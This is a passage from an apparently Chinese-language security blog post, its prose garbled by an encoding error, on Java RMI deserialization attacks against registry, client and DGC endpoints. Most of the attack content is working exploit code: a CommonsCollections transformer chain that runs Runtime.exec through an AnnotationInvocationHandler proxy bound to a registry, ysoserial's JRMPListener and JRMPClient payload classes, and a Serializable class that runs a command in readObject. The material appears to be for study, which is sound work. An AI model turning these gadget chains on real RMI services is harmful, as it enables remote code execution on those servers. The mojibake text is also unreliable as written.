ç«¯çš„æ”»å‡»æ—¶ï¼Œè¿˜å‡ºç°äº†å¦å¤–ä¸€ç§é’ˆå¯¹å‚æ•°çš„æ”»å‡»æ€è·¯ï¼Œsu18å¸ˆå‚…ç§°å…¶ä¸ºæ›¿èº«æ”»å‡»ã€‚ä¾æ—§æ˜¯ç”¨æ¥ç»•è¿‡å½“å‚æ•°ä¸æ˜¯ Objectï¼Œæ˜¯æŒ‡å®šç±»å‹ï¼Œä½†æ˜¯è¿˜æƒ³è§¦å‘ååºåˆ—åŒ–çš„ä¸€ç§è®¨è®ºã€‚</p><p>å¤§ä½“çš„æ€è·¯å°±æ˜¯è°ƒç”¨çš„æ–¹æ³•å‚æ•°æ˜¯ <code>HelloObject</code>ï¼Œè€Œæ”»å‡»è€…å¸Œæœ›ä½¿ç”¨ CC é“¾æ¥ååºåˆ—åŒ–ï¼Œæ¯”å¦‚ä½¿ç”¨äº†ä¸€ä¸ªå…¥å£ç‚¹ä¸º HashMap çš„ POCï¼Œé‚£ä¹ˆæ”»å‡»è€…åœ¨æœ¬åœ°çš„ç¯å¢ƒä¸­å°† HashMap é‡å†™ï¼Œè®© HashMap ç»§æ‰¿ HelloObjectï¼Œç„¶åå®ç°ååºåˆ—åŒ–æ¼æ´æ”»å‡»çš„é€»è¾‘ï¼Œç”¨æ¥æ¬ºéª— RMI çš„æ ¡éªŒæœºåˆ¶ã€‚</p><p>è¿™çš„ç¡®æ˜¯ä¸€ç§æ€è·¯ï¼Œä½†æ˜¯è¿˜ä¸å¦‚ hook RMI ä»£ç ä¿®æ”¹é€»è¾‘æ¥å¾—å¿«ï¼Œæ‰€ä»¥è¿™é‡Œä¸è¿›è¡Œæµ‹è¯•ã€‚</p><h3 id="Registry-ç«¯-Attack"><a href="#Registry-ç«¯-Attack" class="headerlink" title="Registry ç«¯ Attack"></a>Registry ç«¯ Attack</h3><p>åœ¨ä½¿ç”¨ Registry æ—¶ï¼Œé¦–å…ˆç”± Server ç«¯å‘ Registry ç«¯ç»‘å®šæœåŠ¡å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯ä¸€ä¸ª Server ç«¯ç”Ÿæˆçš„åŠ¨æ€ä»£ç†ç±»ï¼ŒRegistry ç«¯ä¼šååºåˆ—åŒ–è¿™ä¸ªç±»å¹¶å­˜åœ¨è‡ªå·±çš„ RegistryImpl çš„ bindings ä¸­ï¼Œä»¥ä¾›åç»­çš„æŸ¥è¯¢ã€‚</p><p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬æ˜¯ä¸€ä¸ªæ¶æ„çš„ Server ç«¯ï¼Œå‘ Registry ç«¯è¾“é€äº†ä¸€ä¸ªæ¶æ„çš„å¯¹è±¡ï¼Œåœ¨å…¶ååºåˆ—åŒ–æ—¶å°±å¯ä»¥è§¦å‘æ¶æ„è°ƒç”¨ã€‚</p><p>è¿™é‡Œä»ç„¶ç”¨ CC6 æµ‹è¯•ï¼Œè€Œå› ä¸º bind çš„å‚æ•°æ˜¯éœ€è¦æ˜¯ Remote ç±»å‹çš„ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨äº† AnnotationInvocationHandler æ¥ä»£ç†äº† Remote æ¥å£ï¼Œå½¢æˆäº†ååºåˆ—åŒ–æ¼æ´ã€‚</p><p>å½¢å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// è¿æ¥ Registry</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br><br>        <span class="hljs-comment">//ä½¿ç”¨ AnnotationInvocationHandler åŠ¨æ€ä»£ç† Remote</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        HashMap&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;EddieMurphy&quot;</span>, getEvilClass());<br><br>        <span class="hljs-comment">//ä½¿ç”¨åŠ¨æ€ä»£ç†åˆå§‹åŒ– AnnotationInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map);<br><br>        <span class="hljs-comment">//ä½¿ç”¨ AnnotationInvocationHandler åŠ¨æ€ä»£ç† Remote</span><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, invocationHandler);<br><br>        <span class="hljs-comment">//bind åˆ° Registry æ—¶ä¼šè§¦å‘ååºåˆ—åŒ–</span><br>        registry.rebind(<span class="hljs-string">&quot;EddieMurphy&quot;</span>, remote);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getEvilClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// åˆå§‹åŒ– Hashmap</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-comment">// åˆ›å»º ChainedTransformer</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦ Registry ç«¯å…·æœ‰ç›¸åº”çš„ä¾èµ–åŠç›¸åº” JDK ç‰ˆæœ¬éœ€æ±‚ã€‚</p><p>è¿™ä¸ªæ”»å‡»æ‰‹æ®µå®é™…ä¸Šå°±æ˜¯ ysoserial ä¸­çš„ <strong>ysoserial.exploit.RMIRegistryExploit</strong> çš„å®ç°åŸç†ã€‚</p><p>é™¤äº† bindï¼Œç”±äº lookup&#x2F;rebind ç­‰æ–¹æ³•å‡é€šè¿‡ååºåˆ—åŒ–ä¼ é€’æ•°æ®ï¼Œå› æ­¤æ­¤å¤„çš„å®é™…æ”»å‡»æ‰‹æ®µä¸æ­¢ bind ä¸€ç§ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåä¹‰ä¸Šçš„ Server ç«¯å’Œ Client ç«¯éƒ½å¯ä»¥æ”»å‡» Registry ç«¯ã€‚</p><h3 id="Client-ç«¯-Attack"><a href="#Client-ç«¯-Attack" class="headerlink" title="Client ç«¯ Attack"></a>Client ç«¯ Attack</h3><p>å¦‚æœæ”»å‡»çš„ç›®æ ‡ä½œä¸º Client ç«¯ï¼Œä¹Ÿå°±æ˜¯åœ¨ Registry åœ°å€å¯æ§ï¼Œæˆ– Registry&#x2F;Server ç«¯å¯æ§ï¼Œä¹Ÿæ˜¯å¯ä»¥å¯¼è‡´æ”»å‡»çš„ã€‚å®¢æˆ·ç«¯ä¸»è¦æœ‰ä¸¤ä¸ªäº¤äº’è¡Œä¸ºï¼Œç¬¬ä¸€æ˜¯ä» Registry ç«¯è·å–è°ƒç”¨æœåŠ¡çš„ stub å¹¶ååºåˆ—åŒ–ï¼Œç¬¬äºŒæ­¥æ˜¯è°ƒç”¨æœåŠ¡åè·å–æ‰§è¡Œç»“æœå¹¶ååºåˆ—åŒ–ã€‚</p><p>è¿™éƒ¨åˆ†æ”»å‡»å®æˆ˜æ„ä¹‰è¾ƒå°‘ï¼Œå¹¶ä¸”ä¸ä¸Šè¿°è®¨è®ºçš„æ”»å‡» Server ç«¯å’Œ Registry ç«¯çš„æ”»å‡»éƒ½æ˜¯é•œåƒè¡Œä¸ºï¼Œæ‰€ä»¥è¿™é‡Œç®€å•æè¿°ä¸€ä¸‹æµç¨‹å°±ä¸å†æ¼”ç¤ºäº†ã€‚</p><p>å®¢æˆ·ç«¯çš„æ”»å‡»å’Œä¸Šé¢çš„éƒ½ç±»ä¼¼ï¼Œå¤§æ¦‚å°±ä¸‹é¢å‡ ä¸ªæ”»å‡»ç‚¹</p><ul><li>æ¶æ„Serverè¿”å›æ–¹æ³•è°ƒç”¨ç»“æœ</li><li>æ¶æ„Server(Registry)è¿”å›Stub</li><li>åŠ¨æ€ç±»åŠ è½½ï¼ˆServerè¿”å›çš„è°ƒç”¨ç»“æœè‹¥ä¸ºå®¢æˆ·ç«¯ä¸å­˜åœ¨çš„ç±»ï¼Œå®¢æˆ·ç«¯ä¹Ÿæ”¯æŒåŠ¨æ€åŠ è½½ï¼‰</li></ul><h3 id="DGC-Attack"><a href="#DGC-Attack" class="headerlink" title="DGC Attack"></a>DGC Attack</h3><p><strong>DGCï¼ˆDistributed Garbage Collectionï¼‰</strong>â€”â€” åˆ†å¸ƒå¼åƒåœ¾å›æ”¶ï¼Œå½“ Server ç«¯è¿”å›ä¸€ä¸ªå¯¹è±¡åˆ° Client ç«¯ï¼ˆè¿œç¨‹æ–¹æ³•çš„è°ƒç”¨æ–¹ï¼‰æ—¶ï¼Œå…¶è·Ÿè¸ªè¿œç¨‹å¯¹è±¡åœ¨ Client ç«¯ä¸­çš„ä½¿ç”¨ã€‚å½“å†æ²¡æœ‰æ›´å¤šçš„å¯¹ Client è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨æ—¶ï¼Œæˆ–è€…å¦‚æœå¼•ç”¨çš„â€œç§Ÿå€Ÿâ€è¿‡æœŸå¹¶ä¸”æ²¡æœ‰æ›´æ–°ï¼ŒæœåŠ¡å™¨å°†åƒåœ¾å›æ”¶è¿œç¨‹å¯¹è±¡ã€‚å¯åŠ¨ä¸€ä¸ª RMI æœåŠ¡ï¼Œå°±ä¼šä¼´éšç€ DGC æœåŠ¡ç«¯çš„å¯åŠ¨ã€‚</p><p>RMI å®šä¹‰äº†ä¸€ä¸ª <code>java.rmi.dgc.DGC</code> æ¥å£ï¼Œæä¾›äº†ä¸¤ä¸ªæ–¹æ³• <code>dirty</code> å’Œ <code>clean</code>ï¼š</p><ul><li>å®¢æˆ·ç«¯æƒ³è¦ä½¿ç”¨æœåŠ¡ç«¯ä¸Šçš„è¿œç¨‹å¼•ç”¨ï¼Œä½¿ç”¨ <code>dirty</code> æ–¹æ³•æ¥æ³¨å†Œä¸€ä¸ªã€‚åŒæ—¶è¿™è¿˜è·Ÿç§Ÿæˆ¿å­ä¸€æ ·ï¼Œè¿‡æ®µæ—¶é—´ç»§ç»­ç”¨çš„è¯è¿˜è¦å†è°ƒç”¨ä¸€æ¬¡æ¥ç»­ç§Ÿã€‚</li><li>å®¢æˆ·ç«¯ä¸ä½¿ç”¨çš„æ—¶å€™ï¼Œéœ€è¦è°ƒç”¨ <code>clean</code> æ–¹æ³•æ¥æ¸…æ¥šè¿™ä¸ªè¿œç¨‹å¼•ç”¨ã€‚</li></ul><p>è¿™ä¸ªæ¥å£æœ‰ä¸¤ä¸ªå®ç°ç±»ï¼Œåˆ†åˆ«æ˜¯ <code>sun.rmi.transport.DGCImpl</code> ä»¥åŠ <code>sun.rmi.transport.DGCImpl_Stub</code>ï¼ŒåŒæ—¶è¿˜å®šä¹‰äº† <code>sun.rmi.transport.DGCImpl_Skel</code>ã€‚</p><p>è¿™ä¸ªå‘½åæ–¹å¼çœ‹ç€ç¡®å®éå¸¸çœ¼ç†Ÿã€‚</p><p>æ²¡é”™ï¼Œå¾ˆåƒ Registryã€RegistryImplã€RegistryImpl_Stubã€RegistryImpl_Skelï¼Œå®é™…ä¸Šä¸å•æ˜¯å‘½åç›¸è¿‘ï¼Œå¤„ç†é€»è¾‘ä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚é€šè¿‡åœ¨æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä¹‹é—´ä¼ é€’å¼•ç”¨ï¼Œä¾æ—§æ˜¯ Stub ä¸ Skel ä¹‹é—´çš„é€šä¿¡æ¨¡å¼ï¼šServer ç«¯å¯åŠ¨ DGCImplï¼Œåœ¨ Registry ç«¯æ³¨å†Œ DGCImpl_Stub ï¼ŒClient ç«¯è·å–åˆ° DGCImpl_Stubï¼Œé€šè¿‡å…¶ä¸ Server ç«¯é€šä¿¡ï¼ŒServer ç«¯ä½¿ç”¨ RegistryImpl_Skel æ¥å¤„ç†ã€‚</p><p>æ”»å‡»æ‰‹æ®µå°±æ˜¯</p><p>DGCImpl_Stub#dirty</p><p>DGCImpl_Skel#dispatch</p><p>è§ysoserialçš„<code>exploit.JRMPListener</code>å’Œ<code>exploit.JRMPClient</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPListener</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PayloadRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;UnicastRemoteObject&gt; &#123;<br><br>    <span class="hljs-keyword">public</span> UnicastRemoteObject <span class="hljs-title function_">getObject</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String command )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">jrmpPort</span> <span class="hljs-operator">=</span> Integer.parseInt(command);<br>        <span class="hljs-type">UnicastRemoteObject</span> <span class="hljs-variable">uro</span> <span class="hljs-operator">=</span> Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>            RemoteRef.class<br>        &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnicastServerRef</span>(jrmpPort)<br>        &#125;);<br><br>        Reflections.getField(UnicastRemoteObject.class, <span class="hljs-string">&quot;port&quot;</span>).set(uro, jrmpPort);<br>        <span class="hljs-keyword">return</span> uro;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        PayloadRunner.run(JRMPListener.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPClient</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PayloadRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;Registry&gt; &#123;<br><br>    <span class="hljs-keyword">public</span> Registry <span class="hljs-title function_">getObject</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String command )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        String host;<br>        <span class="hljs-type">int</span> port;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">sep</span> <span class="hljs-operator">=</span> command.indexOf(<span class="hljs-string">&#x27;:&#x27;</span>);<br>        <span class="hljs-keyword">if</span> ( sep &lt; <span class="hljs-number">0</span> ) &#123;<br>            port = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">65535</span>);<br>            host = command;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            host = command.substring(<span class="hljs-number">0</span>, sep);<br>            port = Integer.valueOf(command.substring(sep + <span class="hljs-number">1</span>));<br>        &#125;<br>        <span class="hljs-type">ObjID</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjID</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt()); <span class="hljs-comment">// RMI registry</span><br>        <span class="hljs-type">TCPEndpoint</span> <span class="hljs-variable">te</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPEndpoint</span>(host, port);<br>        <span class="hljs-type">UnicastRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnicastRef</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LiveRef</span>(id, te, <span class="hljs-literal">false</span>));<br>        <span class="hljs-type">RemoteObjectInvocationHandler</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjectInvocationHandler</span>(ref);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>            Registry.class<br>        &#125;, obj);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());<br>        PayloadRunner.run(JRMPClient.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ”»å‡»çš„gadgetåˆ† UnicastRemoteObjectã€UnicastRefå’ŒRemoteObjectä¸‰ç§ã€‚è¿™é‡Œä¸åšè¿‡å¤šè§£é‡Šã€‚</p><p>æ€»ç»“ä¸º</p><ul><li>exploit<ul><li>JRMPListnerï¼šæ„é€ æ¶æ„JRMPæœåŠ¡å™¨ï¼Œè¿”å›å¼‚å¸¸è®©å®¢æˆ·ç«¯ååºåˆ—åŒ– <code>StreamRemoteCall#executeCall</code></li><li>JRMPClientï¼šå‘é€æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œæ‰“DGCæœåŠ¡ <code>DGCImpl_Skel#dispatch</code></li></ul></li><li>payloads<ul><li>JRMPListnerï¼š<code>UnicastRemoteObject</code>ååºåˆ—åŒ–æ—¶ä¼šå¯¼å‡ºå¯¹è±¡ï¼Œè§¦å‘JRMPç›‘å¬ç«¯å£ï¼Œé…åˆexploit.JRMPClientæ‰“</li><li>JRMPClientï¼š<code>UnicastRef</code>ååºåˆ—åŒ–æ—¶ä¼šè§¦å‘DGCçš„<code>ditry</code>ï¼Œé…åˆexploit.JRMPListneræ‰“</li></ul></li></ul><h2 id="Final-Test"><a href="#Final-Test" class="headerlink" title="Final Test"></a>Final Test</h2><p>æœ€åæµ…æµ…æ‰“ä¸€ä¸ªç®€å•ä½¿ç”¨RMIæœåŠ¡è°ƒç”¨è¿œç¨‹å¯¹è±¡ååºåˆ—åŒ–å¼¹calcä½œä¸ºæˆ‘æœ€åçš„ç»“æŸå§ï¼ŒJEP 290çš„bypassæ”¾åœ¨åé¢æ–‡ç« å†è¿›è¡Œå¤ç°ã€‚JNDIä¹ŸåŒæ ·ä¼šæ”¾åœ¨åé¢å†è¯¦ç»†å¤ç›˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream objectInputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        objectInputStream.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">RMITestImpl</span> <span class="hljs-variable">rmiTest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMITestImpl</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">8081</span>);<br>        registry.bind(<span class="hljs-string">&quot;EddieMurphy&quot;</span>,rmiTest);<br>        System.out.println(<span class="hljs-string">&quot;RMI Server is listening ...&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NotBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">8081</span>);<br>        <span class="hljs-type">RMITest</span> <span class="hljs-variable">rmiTest</span> <span class="hljs-operator">=</span> (RMITest) registry.lookup(<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        rmiTest.sayObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">payload</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span 